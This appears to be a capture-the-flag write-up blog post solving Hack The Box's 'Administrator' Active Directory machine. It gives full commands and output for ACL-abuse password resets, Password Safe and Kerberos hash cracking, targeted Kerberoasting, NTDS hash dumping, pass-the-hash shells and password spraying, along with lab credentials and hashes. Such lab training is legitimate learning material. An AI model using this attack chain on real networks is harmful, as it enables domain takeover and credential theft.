---
layout: post
---

<!--excerpt.start-->
[Administrator](https://www.hackthebox.com/machines/Administrator) is a medium difficulty box and it's HTB's first box, in which we are given initial foothold credentials from the very beginning. This box focuses heavily on Active Directory enumeration and privilege escalation. We perform attacks such as Targeted Kerberoasting and ACL abuse.
<!--excerpt.end-->

Initial credentials:
<mark>olivia:ichliebedich</mark>

## Reconnaissance
---
### Nmap

Scan result finds many open TCP ports indicative of a Windows Active Directory domain controller. Let’s break down the output:

- Typical <mark>domain controller (DC)</mark> ports (DNS on 53, Kerberos on 88, RPC on 135, NetBIOS on 139, LDAP on 389, and several others).
- The domain name is <mark>administrator.htb</mark>, and hostname is <mark>DC</mark>.
- FTP on port 21 is open.
- Port 5985 is open, which suggests we could connect via <mark>WinRM</mark>.

{% highlight shell %}
exegol-liemek administrator # nmap 10.10.11.42 -p- -sCV -oA scans/nmap_scan
Starting Nmap 7.93 ( https://nmap.org ) at 2025-05-04 17:28 CEST
Nmap scan report for 10.10.11.42
Host is up (0.030s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst:    
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-04 22:29:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-04 22:29:35Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53088/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53093/tcp open  msrpc         Microsoft Windows RPC
53104/tcp open  msrpc         Microsoft Windows RPC
53115/tcp open  msrpc         Microsoft Windows RPC
53151/tcp open  msrpc         Microsoft Windows RPC
65397/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s
| smb2-time: 
|   date: 2025-05-04T22:30:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun May  4 17:30:41 2025 -- 1 IP address (1 host up) scanned in 104.15 seconds
{% endhighlight %}

### FTP - TCP 21
We can't log in to <mark>FTP</mark> as either <mark>Olivia</mark> or anonymous.

{% highlight shell %}
exegol-liemek administrator # netexec ftp 10.10.11.42 -u olivia -p ichliebedich
FTP         10.10.11.42     21     10.10.11.42      [-] olivia:ichliebedich (Response:530 User cannot log in, home directory inaccessible.)
{% endhighlight %}


### SMB - TCP 445

The guest account is disabled.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u guest -p ''             
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [-] administrator.htb\guest: STATUS_ACCOUNT_DISABLED
{% endhighlight %}

We can enumerate <mark>SMB</mark> using <mark>Olivia</mark>'s credentials.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u olivia -p ichliebedich                                   
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich
{% endhighlight %}

#### Password Policy

We retrieve the password policy, which reveals significant security concerns.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u olivia -p ichliebedich --pass-pol
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [+] Dumping password info for domain: ADMINISTRATOR
SMB         10.10.11.42     445    DC               Minimum password length: 7
SMB         10.10.11.42     445    DC               Password history length: 24
SMB         10.10.11.42     445    DC               Maximum password age: 41 days 23 hours 53 minutes 
SMB         10.10.11.42     445    DC               
SMB         10.10.11.42     445    DC               Password Complexity Flags: 000000
SMB         10.10.11.42     445    DC                   Domain Refuse Password Change: 0
SMB         10.10.11.42     445    DC                   Domain Password Store Cleartext: 0
SMB         10.10.11.42     445    DC                   Domain Password Lockout Admins: 0
SMB         10.10.11.42     445    DC                   Domain Password No Clear Change: 0
SMB         10.10.11.42     445    DC                   Domain Password No Anon Change: 0
SMB         10.10.11.42     445    DC                   Domain Password Complex: 0
SMB         10.10.11.42     445    DC               
SMB         10.10.11.42     445    DC               Minimum password age: 1 day 4 minutes 
SMB         10.10.11.42     445    DC               Reset Account Lockout Counter: 30 minutes 
SMB         10.10.11.42     445    DC               Locked Account Duration: 30 minutes 
SMB         10.10.11.42     445    DC               Account Lockout Threshold: None
SMB         10.10.11.42     445    DC               Forced Log off Time: Not Set
{% endhighlight %}

#### Users

Collecting usernames to create a username list.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u olivia -p ichliebedich --users 
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.42     445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain 
SMB         10.10.11.42     445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.42     445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account 
SMB         10.10.11.42     445    DC               olivia                        2024-10-06 01:22:48 0        
SMB         10.10.11.42     445    DC               michael                       2024-10-06 01:33:37 0        
SMB         10.10.11.42     445    DC               benjamin                      2024-10-06 01:34:56 0        
SMB         10.10.11.42     445    DC               emily                         2024-10-30 23:40:02 0        
SMB         10.10.11.42     445    DC               ethan                         2024-10-12 20:52:14 0        
SMB         10.10.11.42     445    DC               alexander                     2024-10-31 00:18:04 0        
SMB         10.10.11.42     445    DC               emma                          2024-10-31 00:18:35 0        
SMB         10.10.11.42     445    DC               [*] Enumerated 10 local users: ADMINISTRATOR
{% endhighlight %}

#### Shares

We have read privileges over <mark>IPC$</mark>, <mark>NETLOGON</mark> and <mark>SYSVOL</mark> shares. Default shares for a DC.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u olivia -p ichliebedich --shares  
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\olivia:ichliebedich 
SMB         10.10.11.42     445    DC               [*] Enumerated shares
SMB         10.10.11.42     445    DC               Share           Permissions     Remark
SMB         10.10.11.42     445    DC               -----           -----------     ------
SMB         10.10.11.42     445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.42     445    DC               C$                              Default share
SMB         10.10.11.42     445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.42     445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.42     445    DC               SYSVOL          READ            Logon server share
{% endhighlight %}

I will not delve deeper here, as I want to use <mark>BloodHound</mark> to enumerate the entire domain.

### BloodHound

We will use <mark>BloodHound</mark> to identify and analyze possible attack paths. First, let's start with our ingestor.

#### BloodHound-python

We can use a python based ingestor for <mark>BloodHound</mark>.

{% highlight shell %}
exegol-liemek administrator # bloodhound-python -d administrator.htb -c all -u olivia -p ichliebedich -ns 10.10.11.42 --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 06S
INFO: Compressing output into 20250504183824_bloodhound.zip
{% endhighlight %}

#### BloodHound

<mark>Olivia</mark> has <mark>GenericAll</mark> privileges over <mark>Micheal</mark>, which means we have full control over user <mark>Michael</mark>. Let's check what we could do next.

![Olivia GenericAll to Micheal](/assets/img/posts/Administrator/OliviaToMichael.png)

<mark>Michael</mark> has <mark>ForceChangePassword</mark> privileges over <mark>Benjamin</mark>. Well, yes.

![Michael ForceChangePassword to Benjamin](/assets/img/posts/Administrator/MichaelToBenjamin.png)

I can't find a clear path further. However, I have a we will find something along the way as <mark>Benjamin</mark> is a member of <mark>Share Moderators</mark>. 

![Benjamin Groups](/assets/img/posts/Administrator/BenjaminGroups.png)

## Privilege escalation
---

### Abusing ACLs

#### Michael

Having the <mark>GenericAll</mark> privileges I decided to change <mark>Michael</mark>'s password.

{% highlight shell %}
exegol-liemek administrator # net rpc password "michael" "helloItsm3e(123)" -U "administrator.htb"/"olivia"%"ichliebedich" -S 10.10.11.42 
{% endhighlight %}

We just got access to <mark>Michael</mark>'s account.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u michael -p 'helloItsm3e(123)' 
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\michael:helloItsm3e(123)
{% endhighlight %}

{% highlight shell %}
exegol-liemek administrator # netexec winrm 10.10.11.42 -u michael -p 'helloItsm3e(123)'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\michael:helloItsm3e(123) (admin)
{% endhighlight %}

#### Benjamin

With <mark>ForceChangePassword</mark> we can redo the above steps but for user <mark>Benjamin</mark>.

{% highlight shell %}
exegol-liemek administrator # net rpc password "benjamin" "helloItsNotm3e(123)" -U "administrator.htb"/"michael"%"helloItsm3e(123)" -S 10.10.11.42
{% endhighlight %}

<mark>Benjamin</mark> is authorized to access <mark>FTP</mark> and we can retrieve <mark>Backup.psafe3</mark> file from there.

{% highlight shell %}
exegol-liemek administrator # netexec ftp 10.10.11.42 -u benjamin -p "helloItsNotm3e(123)"
FTP         10.10.11.42     21     10.10.11.42      [+] benjamin:helloItsNotm3e(123)
{% endhighlight %}

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u benjamin -p "helloItsNotm3e(123)"
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
{% endhighlight %}

{% highlight shell %}
SMB         10.10.11.42     445    DC               [+] administrator.htb\benjamin:helloItsNotm3e(123) 
exegol-liemek administrator # netexec winrm 10.10.11.42 -u benjamin -p "helloItsNotm3e(123)"
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42     5985   DC               [-] administrator.htb\benjamin:helloItsNotm3e(123)
{% endhighlight %}

{% highlight shell %}
exegol-liemek administrator # file Backup.psafe3      
Backup.psafe3: Password Safe V3 database
{% endhighlight %}

### Password Safe

We can download the password manager <mark>Password Safe</mark>.

![Password Safe Google Search](/assets/img/posts/Administrator/PasswordSafe.png)

Upon opening the file we are met with the login prompt.

![Password Safe](/assets/img/posts/Administrator/PasswordSafe2.png)

#### Cracking a hash

We will use the <mark>pwsafe2john.py</mark> tool to extract the password hash and then attempt to crack it to reveal the password, <mark>tekieromucho</mark>.

{% highlight shell %}
exegol-liemek administrator # pwsafe2john.py Backup.psafe3 > psafe3.hash

exegol-liemek administrator # john --wordlist=/opt/lists/rockyou.txt psafe3.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 128/128 SSE2 4x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 20 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2025-05-04 20:12) 5.000g/s 51200p/s 51200c/s 51200C/s 123456..11221122
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
{% endhighlight %}

In the <mark>PasswordSafe</mark> application, we find passwords of three users. Let's analyze what we can do with those users in BloodHound.

![](/assets/img/posts/Administrator/PasswordSafe3.png)

### Targeted Kerberoasting

User <mark>Emily</mark> has <mark>GenericWrite</mark> privileges over <mark>Ethan</mark>. With <mark>GenericWrite</mark>, we can modify most of the user's attributes. We can change <mark>Ethan</mark>'s <mark>ServicePrincipalName (SPN)</mark> to any value we want, <mark>Kerberoast</mark> the service ticket, and then revert the <mark>SPN</mark> to its original state. This attack could also be performed on <mark>Michael</mark>, as it works with <mark>GenericAll</mark> privileges as well. Learn more about it [here](https://blog.harmj0y.net/activedirectory/targeted-kerberoasting/).

![](/assets/img/posts/Administrator/EmilyToEthan.png)

#### Emily

{% highlight shell %}
exegol-liemek administrator # netexec winrm 10.10.11.42 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (admin)
{% endhighlight %}

First, let's retrieve the user flag.

{% highlight shell %}
exegol-liemek administrator # evil-winrm -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" -i "10.10.11.42"

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\emily\Documents> type ..\Desktop\user.txt
dc4c2b**************************
{% endhighlight %}

Synchronize the time between our local machine and remote host, so we don't get a clock skew error.

{% highlight shell %}
exegol-liemek administrator # faketime "$(date +'%Y-%m-%d') $(net time -S 10.10.11.42 | awk '{print $4}')" zsh

exegol-liemek administrator # date
Mon May  5 04:33:06 AM CEST 2025
exegol-liemek administrator # rdate -n 10.10.11.42                                                            
Mon May  5 04:33:12 CEST 2025
{% endhighlight %}

Perform the attack using <mark>targetedKerberoast.py</mark>.

{% highlight shell %}
exegol-liemek hashes # targetedKerberoast.py -v -d "administrator.htb" -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb"
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (ethan)
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$469505f397ecd52d0e61e7d5622acfbf$d7519accbcdfdce61c9233d7a65462e47bd9f69adc3abe410b3<SNIP>
{% endhighlight %}

### Cracking a hash

We crack the <mark>Kerberos</mark> hash and revealing the password <mark>limpbizkit</mark>.

{% highlight shell %}
exegol-liemek hashes # hashcat -a 0 -m 13100 ethan.txt /opt/lists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$599484f68ce765d2be682350035ac511$6478dd4<SNIP>:limpbizkit
{% endhighlight %}

### Dumping NTLM hashes

Using <mark>Ethan</mark>'s credentials we dump <mark>NTLM hashes</mark>.

{% highlight shell %}
exegol-liemek hashes # netexec smb 10.10.11.42 -u 'ethan' -p 'limpbizkit' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] 
SMB         10.10.11.42     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit 
SMB         10.10.11.42     445    DC               [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.10.11.42     445    DC               [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.11.42     445    DC               Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
SMB         10.10.11.42     445    DC               Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.42     445    DC               krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
SMB         10.10.11.42     445    DC               administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
SMB         10.10.11.42     445    DC               administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:fd4d91c11452ab7660d5fd45173455ae:::
SMB         10.10.11.42     445    DC               administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:5ab83367aaa6c8be5b78401dfdb55823:::
SMB         10.10.11.42     445    DC               administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
SMB         10.10.11.42     445    DC               administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
SMB         10.10.11.42     445    DC               administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
SMB         10.10.11.42     445    DC               administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
SMB         10.10.11.42     445    DC               DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
SMB         10.10.11.42     445    DC               [+] Dumped 11 NTDS hashes to /root/.nxc/logs/ntds/DC_10.10.11.42_2025-05-05_045854.ntds of which 10 were added to the database
SMB         10.10.11.42     445    DC               [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.10.11.42     445    DC               [*] cat /root/.nxc/logs/ntds/DC_10.10.11.42_2025-05-05_045854.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.10.11.42     445    DC               [*] grep -iv disabled /root/.nxc/logs/ntds/DC_10.10.11.42_2025-05-05_045854.ntds | cut -d ':' -f1
{% endhighlight %}

### Getting a shell

#### Administrator

{% highlight shell %}
exegol-liemek hashes # netexec winrm 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
WINRM       10.10.11.42     5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.10.11.42     5985   DC               [+] administrator.htb\administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (admin)
{% endhighlight %}

We perform a <mark>pass-the-hash (PtH)</mark> attack to log in as <mark>Administrator</mark> and retrieve the root flag.

{% highlight shell %}
exegol-liemek hashes # evil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
e8fc16**************************
{% endhighlight %}

We completely <mark>compromised</mark> the entire AD domain. Now is the time to clean up after ourselves. We can't clean up changed passwords, so it is best to use methods that avoid changing them at all.

## Alternative path
---

Recall that the password policy does not stop brute-force attacks. We can leverage that and start brute-forcing our way in.

When we enumerated <mark>SMB</mark>, we retrieved a bunch of usernames from which we can create a username list.

{% highlight shell %}
exegol-liemek administrator # cat username_list.txt 
emma
alexander
ethan
emily
benjamin
michael
{% endhighlight %}

This way we can get a hit on user <mark>Ethan</mark> with a password <mark>limpbizkit</mark>.

{% highlight shell %}
exegol-liemek administrator # netexec smb 10.10.11.42 -u username_list.txt -p /opt/lists/rockyou.txt --continue-on-success --ignore-pw-decoding | grep +
SMB                      10.10.11.42     445    DC               [+] administrator.htb\ethan:limpbizkit
{% endhighlight %}

From there, we can dump <mark>NTLM hashes</mark>, perform a <mark>pass-the-hash (PtH)</mark> attack on <mark>Administrator</mark> and compromise the entire administrator.htb domain. Just like in steps shown above. :)